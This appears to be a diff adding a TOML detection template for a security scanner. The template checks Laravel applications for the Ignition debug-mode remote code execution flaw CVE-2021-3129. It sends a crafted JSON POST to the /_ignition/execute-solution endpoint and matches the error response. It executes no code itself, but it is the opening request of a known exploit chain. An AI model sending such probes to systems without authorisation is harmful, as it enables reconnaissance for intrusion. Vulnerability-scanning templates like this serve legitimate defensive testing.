@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "通过向 Laravel 应用的/_ignition/execute-solution端点发送包含特定参数的POST请求，检测是否开启Debug模式且存在Ignition组件远程代码执行漏洞（CVE-2021-3129）。该方法仅触发错误页面，不执行实际代码，为安全无损检测。"
+id = "POC-AVE-2021-1689"
+name = "Laravel Ignition Debug Mode RCE 漏洞检测"
+severity = "critical"
+tags = ["ave-2021-1689"]
+vuln_id = [
+    "CVE-2021-3129",
+    "AVE-2021-1689",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/_ignition/execute-solution"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cve20213129","viewFile":"test"}}'
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['Facade\Ignition\Solutions\MakeViewVariableOptionalSolution']
